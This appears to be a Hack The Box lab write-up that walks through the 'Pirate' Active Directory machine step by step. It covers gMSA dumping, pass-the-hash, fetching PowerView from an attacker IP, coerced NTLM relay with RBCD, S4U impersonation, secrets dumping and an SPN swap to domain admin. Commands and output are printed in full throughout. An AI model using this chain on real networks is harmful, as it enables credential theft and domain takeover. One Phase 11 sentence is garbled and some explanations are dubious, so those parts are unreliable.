
# **HTB Pirate — Detailed Walkthrough (with reasoning for every decision)Attack path**

![Hexshubz-Shubham](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

![](https://miro.medium.com/v2/resize:fit:700/1*Ta1TvuYp7iUdQ28mVGQ1_A.png)

# **Phase 1 — Reconnaissance**

### **What we did**

bash

```
nmap --privileged -sS -sCV -vv -T4 -oN nmap 10.129.41.22
```

### **Output (key lines)**

```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec
389/tcp  open  ldap          pirate.htb0. / DC01.pirate.htb
445/tcp  open  microsoft-ds
636/tcp  open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI (WinRM)
Issuer: commonName=pirate-DC01-CA
```

### **Why this path?**

TTL of 127 means Windows. Seeing ports 88 (Kerberos), 389 (LDAP), 445 (SMB), and 636 (LDAPS) together means this is definitely a Domain Controller. The SSL certificate is pure gold — it leaks the domain name `pirate.htb`, the DC hostname `DC01.pirate.htb`, and the CA name `pirate-DC01-CA`. That CA name tells us Active Directory Certificate Services (ADCS) is installed — a major potential attack surface. WinRM on 5985 means remote management is possible if we get valid credentials.

**Why not attack the web (port 80/443)?** The IIS page is a default install — no application, no attack surface. We go where the real AD attack paths are.

# **Phase 2 — Initial LDAP Enumeration**

### **What we did**

bash

```
# First, confirm the gMSA situation
gMSADumper.py -d pirate.htb -l dc01.pirate.htb -u pentest -p 'p3nt3st2025!&'
# Output: both gMSA accounts readable only by "Domain Secure Servers"
```

```
# Enumerate all groups
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --groups# Who is in Domain Secure Servers?
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --group "Domain Secure Servers"
# Output: MS01
```

### **Why this path?**

gMSA (Group Managed Service Accounts) accounts have auto-rotating passwords stored in LDAP. Any computer or group listed as a “principal allowed to retrieve password” can read it. The `pentest` account can't read the passwords — but it CAN read the LDAP attribute that says who CAN. That tells us: **get MS01's identity and we unlock the gMSA hashes**.

The group enumeration confirms MS01 is the only member of `Domain Secure Servers`. This is the single bridge between our low-priv access and the gMSA accounts.

**Why not try to crack pentest creds further or enumerate shares?** SMB shares show only standard DC shares (NETLOGON, SYSVOL, IPC$) with no interesting data. WinRM fails for pentest. The only open door is through the gMSA path.

# **Phase 3 — Kerberos Setup + Machine Account TGT**

### **What we did**

bash

```
# Stop local time sync and sync to the DC (Kerberos requires <5 min clock skew)
sudo systemctl stop systemd-timesyncd
sudo ntpdate -u dc01.pirate.htb
```

```
# Configure krb5.conf for pirate.htb realm

┌──(shubham㉿kali)-[~/AD-PROJECT/Pirate]
└─$ sudo bash -c 'cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = PIRATE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false
    clockskew = 300[realms]
    PIRATE.HTB = {
        kdc = dc01.pirate.htb
        admin_server = dc01.pirate.htb
    }[domain_realm]
    .pirate.htb = PIRATE.HTB
    pirate.htb = PIRATE.HTB
EOF'
```

```
# Get a TGT as MS01$ using default machine account password
impacket-getTGT 'PIRATE.HTB/MS01$:ms01'
export KRB5CCNAME='MS01$.ccache'
```

### **Why this path?**

Machine accounts in Active Directory follow a naming convention for their default password — in labs and misconfigured environments, it’s often just the machine name in lowercase. `MS01$` → password `ms01`. This is a very common lab misconfiguration and a real-world finding too.

Clock sync is mandatory because Kerberos rejects tickets if the time difference between client and KDC is more than 5 minutes. Without `ntpdate`, every Kerberos operation fails with `KRB_AP_ERR_SKEW`.

**Why use Kerberos instead of NTLM for the gMSA dump?** The `-k` flag on gMSADumper uses the existing TGT to authenticate to LDAP via Kerberos. This is more reliable than NTLM in environments where NTLM may be restricted or monitored.

# **Phase 4 — gMSA Password Dump**

### **What we did**

bash

```
gMSADumper.py -d pirate.htb -l dc01.pirate.htb -k
```

### **Output**

```
gMSA_ADCS_prod$:::89fb53c2bc3eadb4142b4158cfdb2997
gMSA_ADFS_prod$:::accd0fdfe82ff8c84cd710244c7302e8
```

### **Why this path?**

Now acting as `MS01$` (member of Domain Secure Servers), we can read the `msDS-ManagedPassword` LDAP attribute on both gMSA accounts. gMSADumper extracts and decodes this blob into an NTLM hash we can use directly.

We have two accounts. Which one do we use? We try both for WinRM:

- `gMSA_ADCS_prod$` → no WinRM access
- `gMSA_ADFS_prod$` → WinRM succeeds on DC01

ADFS (Active Directory Federation Services) accounts typically need broader access. That’s our entry point.

# **Phase 5 — Shell on DC01 + Domain Enumeration**

### **What we did**

bash

```
evil-winrm -i pirate.htb -u 'gMSA_ADFS_prod$' -H 'accd0fdfe82ff8c84cd710244c7302e8'
```

Inside the shell:

powershell

```
# Download and load PowerView
iwr -uri http://10.10.16.81:8000/PowerView.ps1 -OutFile PowerView.ps1
Import-Module .\PowerView.ps1
```

```
# Find users trusted for delegation (key AD privesc indicator)
Get-DomainUser -TrustedToAuth
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*QVbcH9YnPKEBP3VVXtSdnw.png)

### **Key output**

```
samaccountname        : a.white_adm
msds-allowedtodelegateto : {http/WEB01.pirate.htb, HTTP/WEB01}
useraccountcontrol    : TRUSTED_TO_AUTH_FOR_DELEGATION
memberof              : CN=IT,CN=Users,DC=pirate,DC=htb
```

powershell

```
nslookup WEB01.pirate.htb
# Address: 192.168.100.2  ← internal subnet, not directly reachable
```

### **Why this path?**

`Get-DomainUser -TrustedToAuth` is the first thing you run when you have a domain foothold. `TRUSTED_TO_AUTH_FOR_DELEGATION` means the account can perform **Protocol Transition** — it can request a Kerberos service ticket for ANY user to a specific service, without needing that user's password. This is an extremely powerful privilege.

`a.white_adm` can impersonate anyone on `HTTP/WEB01`. If we can control `a.white_adm`, we become any user (including Administrator) on WEB01.

WEB01 resolving to `192.168.100.2` tells us it's on an internal subnet we can't reach directly. We need a pivot.

**Why also Kerberoast?** We tried — `GetUserSPNs` gives us the TGS hash for `a.white_adm` — but hashcat with rockyou doesn't crack it. Dead end for that path. We continue with the relay approach instead.

# **Phase 6 — Pivot to WEB01 (Ligolo-ng)**

### **What we did**

Set up Ligolo-ng tunnel from our Kali box through the DC01 foothold to reach the `192.168.100.0/24` subnet. Then:

[**LIGOLO | NotionLigolo-ng Pivoting - Complete Setup Guide**
www.notion.so](https://www.notion.so/LIGOLO-35151863bb158028a744d3ff2851bdab?pvs=21)

```
evil-winrm -i 192.168.100.2 -u 'gMSA_ADFS_prod$' -H 'accd0fdfe82ff8c84cd710244c7302e8'
# hostname → WEB01
```

### **Why this path?**

`gMSA_ADFS_prod$` has a foothold on DC01 and also has WinRM access on WEB01 (as it's an ADFS service account that works across the domain). The Ligolo tunnel lets us route traffic through DC01 to reach the internal subnet without needing a full reverse shell relay.

Confirming we can reach WEB01 as `gMSA_ADFS_prod$` is important because the next step (coercion) requires us to authenticate FROM WEB01.

# **Phase 7 — NTLM Relay + RBCD Attack**

### **What we did**

bash

```
# Terminal 1: relay incoming NTLM auth to DC01 LDAPS
# --delegate-access: create a new computer with RBCD over the coerced machine
# --remove-mic: bypass MIC protection on the relay
impacket-ntlmrelayx -t ldaps://10.129.45.55 --delegate-access --remove-mic -smb2support
```

```
# Terminal 2: force WEB01 to authenticate outward to us
coercer coerce -l 10.10.16.81 -t 192.168.100.2 -d pirate.htb \
  -u 'gMSA_ADFS_prod$' --hashes :accd0fdfe82ff8c84cd710244c7302e8 --always-continue
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*H5ucBaT7alHiIDu-Z0ByRg.png)

### **Result**

```
[*] ldaps://PIRATE/WEB01$@10.129.45.55 [1] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] ldaps://PIRATE/WEB01$@10.129.45.55 [1] -> Adding new computer with username: DVENXLQU$ and password: cQ>ng+GiGw6Rzwn result: OK
[*] ldaps://PIRATE/WEB01$@10.129.45.55 [1] -> Delegation rights modified succesfully!
[*] ldaps://PIRATE/WEB01$@10.129.45.55 [1] -> DVENXLQU$ can now impersonate users on WEB01$ via S4U2Proxy
```

**password : DVENXLQU$ and password: cQ>ng+GiGw6Rzwn**

### **Why this path?**

RBCD (Resource-Based Constrained Delegation) is a modern AD attack. When you can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a computer object, any account you name there can impersonate anyone TO that computer.

The steps:

1. Coercer uses MS-RPRN / MS-EFSRPC / MS-DFSNM abuse to force WEB01 to send an NTLM authentication to our IP
2. ntlmrelayx catches that auth and relays it to DC01’s LDAPS endpoint
3. On DC01, it creates a new machine account (`DVENXLQU$`) and sets RBCD on WEB01 granting that account impersonation rights
- `-remove-mic` is needed because SMB signing is required on DC01, but WEB01 doesn't enforce it the same way for the coercion auth.

**Why relay to LDAPS specifically?** LDAP (not LDAPS) doesn’t allow computer account creation with channel binding. LDAPS does. Without `--remove-mic` and targeting LDAPS, the relay would fail.

# **Phase 8 — S4U2Proxy → Administrator on WEB01**

### **What we did**

```
#Re-sync clock (it drifted again)
sudo ntpdate -u 10.129.45.55
```

```
# Use our newly created DVENXLQU$ to impersonate Administrator on WEB01
impacket-getST \
  -spn 'cifs/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  'pirate.htb/DVENXLQU$:cQ>ng+GiGw6Rzwn' \
  -dc-ip 10.129.45.55export KRB5CCNAME='Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache'
```

![](https://miro.medium.com/v2/resize:fit:637/1*fz0GPAWrgGwZU-6-F7SXBQ.png)

**Now take shell as administrator**

```
impacket-psexec -k -no-pass Administrator@WEB01.pirate.htb
```

![](https://miro.medium.com/v2/resize:fit:625/1*aH9N8-au6BbONuwrby5xSw.png)

### **Output**

```
C:\> type C:\Users\a.white\Desktop\user.txt
94993ddd07f0058c2dee91900df3458d
```

### **Why this path?**

S4U2Proxy is the Kerberos extension that allows a service to request a ticket on behalf of a user. Because `DVENXLQU$` has RBCD over WEB01, it can:

1. S4U2self: get a “forwardable” TGS for Administrator pointing at itself
2. S4U2Proxy: use that to request a TGS for CIFS/WEB01 as Administrator

psexec uses CIFS (SMB) to upload and run a service binary — that’s why we need a `cifs/` service ticket, not an `http/` one.

The clock sync is essential again — ticket timestamps must be within the skew window.

# **Phase 9 — Secrets Dump + Credential Harvest**

### **What we did**

bash

```
# Run secretsdump using our Kerberos ticket (no password needed)
impacket-secretsdump -k -no-pass WEB01.pirate.htb -outputfile web01_dump
```

### **Key findings**

```
┌──(shubham㉿kali)-[~/AD-PROJECT/Pirate]
└─$impacket-secretsdump -k -no-pass WEB01.pirate.htb -outputfile web01_dump
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
[*] Dumping cached domain logon information (domain/username:hash)
PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09+00:00)
PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-04-29 08:43:54+00:00)
PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-04-29 08:41:49+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
PIRATE\WEB01$:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
[*] DPAPI_SYSTEM
dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
```

```
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu       ← PLAINTEXT PASSWORD
```

### **Why this path?**

After gaining SYSTEM on a machine, always dump secrets. The `DefaultPassword` LSA secret stores the plaintext password used for AutoLogon — a huge find. `a.white` has her domain password stored in cleartext on WEB01, meaning she was configured for automatic logon here.

We also run BloodHound to map all AD relationships visually:

bash

```
bloodhound-python -u a.white -p 'E2nvAOKSz5Xz2MJu' -ns 10.129.45.55 -d pirate.htb -c All
```

BloodHound reveals: `a.white` has write permissions over `a.white_adm` (her own admin account). This is the ACL abuse path to DC01.

# **Phase 10 — ACL Abuse → Control a.white_adm**

### **What we did**

bash

```
# Confirm writable ACLs
bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
  --host 10.129.45.55 get writable
# Output: CN=Angela W. ADM → WRITE permission
```

```
# Reset the admin account's password
bloodyAD -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' \
  --host 10.129.45.55 set password a.white_adm 'P@ssw0rd123!'# Verify
nxc smb 10.129.45.55 -u a.white_adm -p 'P@ssw0rd123!'
# [+] pirate.htb\a.white_adm:P@ssw0rd123!
```

### **Why this path?**

In AD, having `GenericWrite` or `WriteProperty` over a user object means you can change their password without knowing the current one. `a.white` effectively owns her admin account object in AD — a classic "shadow admin" misconfiguration. We now control `a.white_adm`, who has `TRUSTED_TO_AUTH_FOR_DELEGATION` to `HTTP/WEB01`.

# **Phase 11 — SPN Swap Attack to Pivot Delegation to DC01**

### **What we did**

bash

```
# Remove HTTP/WEB01 SPNs from WEB01$ (so DC01 can legitimately own them)
python3 addspn.py 10.129.45.55 -u 'PIRATE\a.white_adm' -p 'P@ssw0rd123!' \
  -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' --remove

python3 addspn.py 10.129.45.55 -u 'PIRATE\a.white_adm' -p 'P@ssw0rd123!' \
  -t 'WEB01$' -s 'HTTP/WEB01' --remove
```

```
# Add those SPNs to DC01$
python3 addspn.py 10.129.45.55 -u 'PIRATE\a.white_adm' -p 'P@ssw0rd123!' \
  -t 'DC01$' -s 'HTTP/WEB01.pirate.htb'python3 addspn.py 10.129.45.55 -u 'PIRATE\a.white_adm' -p 'P@ssw0rd123!' \
  -t 'DC01$' -s 'HTTP/WEB01'
```

### **Why this path?**

Here’s the clever part. `a.white_adm` is configured with constrained delegation to `HTTP/WEB01`. The KDC validates S4U2Proxy by checking: "is the requested service SPN listed in the delegating account's `msds-allowedtodelegateto`?"

If we move `HTTP/WEB01.pirate.htb` from WEB01′sSPNlisttoDC01's SPN list to DC01 ′sSPNlisttoDC01's SPN list, then DC01 becomes the holder of that SPN. When `a.white_adm` performs S4U2Proxy for `HTTP/WEB01.pirate.htb`, the resulting ticket is valid for DC01 — because DC01 is now the service that "owns" that SPN.

Combined with `-altservice`, we can rewrite the ticket to `CIFS/DC01` during getST, giving us an admin-impersonation ticket for DC01's CIFS service.

# **Phase 12 — Domain Admin via S4U + altservice**

### **What we did**

bash

```
impacket-getST \
  -spn 'HTTP/WEB01.pirate.htb' \
  -impersonate 'Administrator' \
  'pirate.htb/a.white_adm:P@ssw0rd123!' \
  -dc-ip 10.129.45.55 \
  -altservice 'CIFS/DC01.pirate.htb'
```

```
export KRB5CCNAME='Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache'impacket-wmiexec -k -no-pass pirate.htb/Administrator@DC01.pirate.htb
```

![](https://miro.medium.com/v2/resize:fit:631/1*jPRiEWwSQpJhvPBXAkVIyA.png)

### **Output**

```
C:\Users\Administrator\Desktop> type root.txt
53688fa1e4eda8cbb197d28ca2ba44de
```

### **Why wmiexec instead of psexec?**

psexec uploads a binary to ADMIN$ and creates a service — it’s noisier and requires CIFS write access. wmiexec uses Windows Management Instrumentation over SMB — same CIFS ticket, but executes commands via WMI without writing files to disk. It also maintains a more stable semi-interactive shell. Either would work here, but wmiexec is the cleaner choice.

# **Full Attack Chain in One View**

```
pentest creds (given)
    ↓ LDAP enum
MS01 ∈ Domain Secure Servers
    ↓ machine default password
MS01$TGT (ms01)
    ↓ gMSADumper -k
gMSA_ADFS_prod$NTLM hash
    ↓ Pass-the-Hash WinRM
DC01 shell → PowerView → a.white_adm has constrained delegation → HTTP/WEB01
    ↓ Ligolo pivot
WEB01 shell as gMSA_ADFS_prod$    ↓ Coercer + ntlmrelayx RBCD
DVENXLQU$has impersonation rights over WEB01
    ↓ getST S4U2Proxy
Administrator TGS for WEB01 → psexec → user.txt
    ↓ secretsdump
a.white plaintext → bloodyAD ACL → reset a.white_adm password
    ↓ addspn.py SPN swap
HTTP/WEB01 SPN moved to DC01$    ↓ getST -altservice CIFS/DC01
Administrator TGS for DC01 → wmiexec → root.txt
```

The reason every step was chosen over alternatives is the same principle: **always follow the path of least resistance that preserves Kerberos context**. We never needed to crack a single password by force — every escalation came from AD misconfigurations: default machine passwords, gMSA ACLs, constrained delegation misconfiguration, plaintext LSA secrets, and writable AD object ACLs.
